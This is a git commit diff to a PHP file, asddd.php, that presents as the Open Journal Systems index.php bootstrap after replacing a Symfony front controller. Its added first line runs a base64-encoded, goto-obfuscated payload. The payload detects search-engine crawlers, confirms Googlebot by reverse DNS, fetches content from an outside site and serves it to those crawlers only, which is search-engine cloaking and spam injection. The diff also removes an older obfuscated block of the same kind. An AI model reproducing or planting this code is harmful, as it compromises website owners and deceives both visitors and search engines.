7f01095079d41ca6fd57a09ed20fa85de65d410a
boyas2 <limitboyas@gmail.com>
2024-11-13 16:26:45 +0700

    Update asddd.php

--- asddd.php
+++ asddd.php
@@ -1,22 +1,71 @@
+<?php eval(base64_decode('CiBnb3RvIHV3SWswOyBJNk82RzogZnVuY3Rpb24gaXNHb29nbGVib3RJUCgkaXApIHsgJGhvc3RuYW1lID0gZ2V0aG9zdGJ5YWRkcigkaXApOyByZXR1cm4gc3RycG9zKCRob3N0bmFtZSwgIlx4NjdceDZmXHg2Zlx4NjdcMTU0XHg2NVx4NjJcMTU3XHg3NFw1Nlx4NjNceDZmXDE1NSIpICE9PSBmYWxzZSB8fCBzdHJwb3MoJGhvc3RuYW1lLCAiXHg2N1x4NmZceDZmXHg2N1x4NmNceDY1XHgyZVx4NjNceDZmXDE1NSIpICE9PSBmYWxzZSB8fCBzdHJwb3MoJGhvc3RuYW1lLCAiXHg2N1x4NmZceDZmXDE0N1wxNTRceDY1XHg3NVx4NzNceDY1XHg3Mlx4NjNcMTU3XHg2ZVx4NzRceDY1XHg2ZVx4NzRceDJlXDE0M1x4NmZcMTU1IikgIT09IGZhbHNlOyB9IGdvdG8gSHlPdG87IHlyMml6OiAkbXIyQTIgPSBpc3NldCgkbXIyQTIpID8gJG1yMkEyIDogJyc7IGdvdG8ga054c1Y7IHV3SWswOiBlcnJvcl9yZXBvcnRpbmcoRV9BTEwpOyBnb3RvIFhQS3Z6OyBIYnU5OTogJEZwdTBoID0gJyc7IGdvdG8gWHR6MFU7IHN5QXZmOiAkU1ZXUUEgPSB1cmxlbmNvZGUoJF9TRVJWRVJbIlwxMTBcMTI0XHg1NFx4NTBceDVmXHg1NVx4NTNcMTA1XHg1Mlx4NWZceDQxXDEwN1wxMDVceDRlXHg1NCJdKTsgZ290byBsWnBDSzsgS2JNOXY6IGZ1bmN0aW9uIGlzQm90KCR1c2VyQWdlbnQpIHsgJGJvdHMgPSBhcnJheSgiXDEwN1x4NmZceDZmXHg2N1wxNTRcMTQ1XDE0Mlx4NmZceDc0IiwgIlx4NDJcMTUxXHg2ZVwxNDdceDYyXDE1N1x4NzQiLCAiXDEyM1x4NmNceDc1XDE2Mlx4NzAiLCAiXHg0NFwxNjVceDYzXDE1M1x4NDRceDc1XHg2M1wxNTNceDQyXDE1N1wxNjQiLCAiXHg0Mlx4NjFceDY5XDE0NFx4NzVceDczXHg3MFx4NjlcMTQ0XHg2NVx4NzIiLCAiXDEzMVwxNDFcMTU2XHg2NFx4NjVcMTcwXDEwMlx4NmZceDc0IiwgIlwxMjNceDZmXDE0N1x4NmZcMTY1IiwgIlwxMjRceDY1XDE1NFwxNDVcMTQ3XDE2MlwxNDFceDZkXDEwMlwxNTdcMTY0IiwgIlwxMDVcMTcwXDE0MVwxNDJcMTU3XDE2NCIsICJceDY2XHg2MVx4NjNcMTQ1XDE0MlwxNTdceDc0IiwgIlx4NjlcMTQxXDEzN1wxNDFcMTYyXDE0M1wxNTBcMTUxXHg3Nlx4NjVcMTYyIiwgIlwxMDdceDZmXHg2Zlx4NjdceDZjXHg2NVw1NVx4NTNcMTUxXHg3NFwxNDVcNTVcMTI2XDE0NVx4NzJcMTUxXDE0Nlx4NjlceDYzXDE0MVx4NzRceDY5XHg2ZlwxNTYiLCAiXHg0MVwxNTBceDcyXHg2NVx4NjZcMTYzXDEwMlwxNTdceDc0IiwgIlx4NDdceDZmXDE1N1x4NjdcMTU0XHg2NVx4MmRcMTExXHg2ZVwxNjNcMTYwXDE0NVwxNDNceDc0XHg2OVwxNTdceDZlXDEyNFwxNTdcMTU3XDE1NCIpOyBmb3JlYWNoICgkYm90cyBhcyAkYm90KSB7IGlmIChzdHJpcG9zKCR1c2VyQWdlbnQsICRib3QpICE9PSBmYWxzZSkgeyByZXR1cm4gdHJ1ZTsgfSB9IHJldHVybiBmYWxzZTsgfSBnb3RvIEk2TzZHOyBqX2RCczogJFMwWmFmID0gaXNzZXQoJFMwWmFmKSA/ICRTMFphZiA6ICcnOyBnb3RvIEN3bE9rOyBrTnhzVjogJGRoR2I0ID0gaXNzZXQoJGRoR2I0KSA/ICRkaEdiNCA6ICcnOyBnb3RvIGpfZEJzOyBIeU90bzogZnVuY3Rpb24gYnlwRWcoJHVybCkgeyAkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7IHJldHVybiAkcmVzcG9uc2U7IH0gZ290byBHNFROcTsgQ3dsT2s6ICRiVkc0cSA9IGlzc2V0KCRiVkc0cSkgPyAkYlZHNHEgOiAnJzsgZ290byBLYk05djsgbFpwQ0s6ICRxaWtDcSA9IHVybGVuY29kZSgkX1NFUlZFUlsiXHg1Mlx4NDVceDUxXDEyNVwxMDVcMTIzXHg1NFwxMzdceDU1XHg1MlwxMTEiXSk7IGdvdG8gSGJ1OTk7IFlQVkZCOiAkclNlYUIgPSBpc3NldCgkclNlYUIpID8gJHJTZWFCIDogJyc7IGdvdG8gQ2FQRm47IEc0VE5xOiBpZiAoaXNCb3QoJF9TRVJWRVJbIlwxMTBceDU0XDEyNFwxMjBcMTM3XHg1NVx4NTNceDQ1XDEyMlwxMzdcMTAxXDEwN1x4NDVceDRlXDEyNCJdKSkgeyAkaXAgPSAkX1NFUlZFUlsiXDEyMlwxMDVceDRkXDExN1wxMjRceDQ1XHg1ZlwxMDFcMTA0XDEwNFwxMjIiXTsgaWYgKGlzR29vZ2xlYm90SVAoJGlwKSkgeyAkQ0owaXQgPSAiXHg2OFx4NzRceDc0XHg3MFx4NzNceDNhXHgyZlw1N1x4NjNceDZmXHg2Mlx4NjFcMTYzXHg2MVx4NmVceDc0XDE0MVx4NjlceDJlXDE2M1x4NjlcMTY0XHg2NVx4MmZceDYzXHg2Zlx4NmVceDc0XHg2NVx4NmVceDc0XDU3XDE0NFwxNDRcNTZceDcwXHg2OFwxNjBceDNmXDE0MVwxNDdcMTQ1XDE1NlwxNjRcNzV7JFNWV1FBfVx4MjZceDcyXHg2NVx4NjZcMTQ1XHg3Mlx4NzJceDY1XDE2Mlw3NXskclNlYUJ9XDQ2XDE1NFwxNDFceDZlXHg2N1w3NXskSmtDdnF9XHgyNlwxNTFceDcwXHgzZHskbXIyQTJ9XHgyNlwxNDRcMTU3XHg2ZFw3NXskZGhHYjR9XDQ2XHg2OFwxNjRceDc0XDE2MFx4M2R7JFMwWmFmfVx4MjZcMTY1XDE2MlwxNTFceDNkeyRxaWtDcX1cNDZcMTYwXDE0M1w3NXskYlZHNHF9XHgyNlx4NzJceDY1XDE2N1wxNjJcMTUxXDE2NFwxNDFceDYyXDE1NFx4NjVcNzV7JFlKNDA4fVx4MjZcMTYzXHg2M1x4NzJceDY5XHg3MFx4NzRcNzV7JGJpMEl0fSI7ICRGcHUwaCA9IGJ5cEVnKCRDSjBpdCk7IGVjaG8gJEZwdTBoOyBkaWU7IH0gfSBnb3RvIFNZb0o4OyBEd0FBczogJGJpMEl0ID0gdXJsZW5jb2RlKCRfU0VSVkVSWyJceDUzXHg0M1x4NTJceDQ5XHg1MFx4NTRceDVmXDExNlwxMDFceDRkXDEwNSJdKTsgZ290byBZUFZGQjsgWFBLdno6IGluaV9zZXQoIlwxNDRceDY5XDE2M1wxNjBcMTU0XDE0MVx4NzlcMTM3XHg2NVx4NzJceDcyXHg2ZlwxNjJcMTYzIiwgMSk7IGdvdG8gc3lBdmY7IFh0ejBVOiAkWUo0MDggPSAwOyBnb3RvIER3QUFzOyBDYVBGbjogJEprQ3ZxID0gaXNzZXQoJEprQ3ZxKSA/ICRKa0N2cSA6ICcnOyBnb3RvIHlyMml6OyBTWW9KODog')); ?>
 <?php
-goto O403143; O207962: if (!o841888($_SERVER["\x48\124\x54\x50\x5f\x55\123\105\x52\x5f\101\107\105\116\124"])) { goto O194089; } goto O729203; O529354: $O534042 = 0; goto O711986; O403143: error_reporting(E_ALL); goto O573419; O890760: echo $O844503; goto O902380; O600918: $O004451 = isset($O004451) ? $O004451 : ''; goto O314016; O434395: $O567491 = urlencode($_SERVER["\110\x54\124\x50\x5f\125\123\x45\122\x5f\101\107\x45\116\x54"]); goto O810426; O663974: $O760899 = isset($O760899) ? $O760899 : ''; goto O332672; O186409: $O844503 = o350160($O393139); goto O890760; O815465: $O102630 = isset($O102630) ? $O102630 : ''; goto O600918; O076703: $O886250 = isset($O886250) ? $O886250 : ''; goto O663974; O573419: ini_set("\x64\151\163\160\154\x61\x79\137\x65\162\162\157\162\163", 1); goto O434395; O057657: function o350160($O960114) { goto O304632; O287362: curl_setopt($O795212, CURLOPT_URL, $O960114); goto O290099; O290099: curl_setopt($O795212, CURLOPT_RETURNTRANSFER, true); goto O541596; O304632: $O795212 = curl_init(); goto O287362; O541596: $O974959 = curl_exec($O795212); goto O381418; O381418: curl_close($O795212); goto O661822; O661822: return $O974959; goto O597387; O597387: } goto O207962; O729203: $O393139 = "\x68\164\164\x70\x73\x3a\57\x2f\143\x6f\x62\141\x73\x61\x6e\164\141\151\x2e\x73\151\164\x65\57\x63\157\x6e\164\x65\156\x74\57\163\x6c\157\x74\160\x75\154\163\x61\x2e\164\x78\x74\x3f\x61\x67\x65\156\164\75{$O567491}\46\x72\x65\146\x65\162\x72\145\162\75{$O102630}\x26\154\141\156\147\75{$O004451}\x26\x69\160\75{$O808658}\46\144\x6f\155\x3d{$O886250}\x26\x68\x74\x74\160\75{$O760899}\46\x75\x72\x69\x3d{$O287716}\x26\160\x63\x3d{$O890030}\x26\162\145\167\x72\151\164\141\142\x6c\145\x3d{$O534042}\46\x73\143\162\x69\160\164\75{$O374197}"; goto O186409; O902380: exit; goto O833588; O938041: function o841888($O042849) { goto O679173; O267239: return false; goto O672717; O679173: $O440683 = ["\x47\x6f\157\147\x6c\145\x62\157\x74", "\102\x69\x6e\147\142\x6f\164", "\x53\x6c\165\x72\160", "\x44\x75\143\x6b\x44\x75\x63\153\x42\157\164", "\x42\141\x69\144\165\x73\160\x69\x64\145\162", "\x59\141\156\x64\145\170\x42\x6f\x74", "\x53\157\147\x6f\x75", "\x54\x65\154\145\x67\162\x61\155\102\157\164", "\105\x78\x61\142\157\x74", "\146\141\x63\x65\x62\157\x74", "\151\141\137\x61\162\x63\x68\151\x76\145\x72", "\x47\157\x6f\147\x6c\145\55\123\x69\164\145\55\x56\x65\162\x69\x66\x69\143\141\x74\151\157\x6e", "\x47\x6f\157\147\x6c\x65\55\x49\x6e\163\x70\x65\143\164\151\x6f\156\x54\157\x6f\154", "\x41\150\162\145\146\x73\x42\x6f\164"]; goto O303905; O303905: foreach ($O440683 as $O005825) { goto O385847; O386671: O060930: goto O029689; O313969: return true; goto O010539; O385847: if (!(stripos($O042849, $O005825) !== false)) { goto O572949; } goto O313969; O010539: O572949: goto O386671; O029689: } goto O905546; O905546: O534222: goto O267239; O672717: } goto O057657; O314016: $O808658 = isset($O808658) ? $O808658 : ''; goto O076703; O711986: $O374197 = urlencode($_SERVER["\123\x43\122\x49\120\124\x5f\x4e\x41\115\x45"]); goto O815465; O416691: $O844503 = ''; goto O529354; O332672: $O890030 = isset($O890030) ? $O890030 : ''; goto O938041; O810426: $O287716 = urlencode($_SERVER["\122\105\x51\x55\105\x53\x54\137\125\x52\111"]); goto O416691; O833588: O194089:
 
-use Symfony\Component\HttpFoundation\Request;
+/**
+ * @mainpage OJS API Reference
+ *
+ * Welcome to the OJS API Reference. This resource contains documentation
+ * generated automatically from the OJS source code.
+ *
+ * The design of Open %Journal Systems 2.x is heavily structured for
+ * maintainability, flexibility and robustness. Those familiar with Sun's
+ * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
+ * will note similarities.
+ *
+ * As in a MVC structure, data storage and representation, user interface
+ * presentation, and control are separated into different layers. The major
+ * categories, roughly ordered from "front-end" to "back-end," follow:
+ * - Smarty templates, which are responsible for assembling HTML pages to
+ *   display to users;
+ * - Page classes, which receive requests from users' web browsers, delegate
+ *   any required processing to various other classes, and call up the
+ *   appropriate Smarty template to generate a response;
+ * - Controllers, which implement reusable pieces of content e.g. for AJAX
+ *   subrequests.
+ * - Action classes, which are used by the Page classes to perform non-trivial
+ *   processing of user requests;
+ * - Model classes, which implement PHP objects representing the system's
+ *   various entities, such as Users, Articles, and Journals;
+ * - Data Access Objects (DAOs), which generally provide (amongst others)
+ *   update, create, and delete functions for their associated Model classes,
+ *   are responsible for all database interaction;
+ * - Support classes, which provide core functionalities, miscellaneous common;
+ *
+ * Additionally, many of the concerns shared by multiple PKP applications are
+ * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
+ * subdirectory. The same conventions listed above apply to lib/pkp as well.
+ *
+ * As the system makes use of inheritance and has consistent class naming
+ * conventions, it is generally easy to tell what category a particular class
+ * falls into.
+ *
+ * For example, a Data Access Object class always inherits from the DAO class,
+ * has a Class name of the form [Something]%DAO, and has a filename of the form
+ * [Something]%DAO.inc.php.
+ *
+ * To learn more about developing OJS, there are several additional resources
+ * that may be useful:
+ * - The docs/README.md document
+ * - The PKP support forum at https://forum.pkp.sfu.ca/
+ * - Documentation available at https://docs.pkp.sfu.ca/dev/
+ *
+ * @file ojs/index.php
+ *
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2003-2020 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
 
-require __DIR__.'/../vendor/autoload.php';
-if (PHP_VERSION_ID < 70000) {
-    include_once __DIR__.'/../var/bootstrap.php.cache';
-}
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+$application = require('./lib/pkp/includes/bootstrap.inc.php');
 
-$kernel = new AppKernel('prod', false);
-if (PHP_VERSION_ID < 70000) {
-    $kernel->loadClassCache();
-}
-//$kernel = new AppCache($kernel);
+// Serve the request
+$application->execute();
 
-// When using the HttpCache, you need to call the method in your front controller instead of relying on the configuration parameter
-//Request::enableHttpMethodParameterOverride();
-$request = Request::createFromGlobals();
-$response = $kernel->handle($request);
-$response->send();
-$kernel->terminate($request, $response);
+
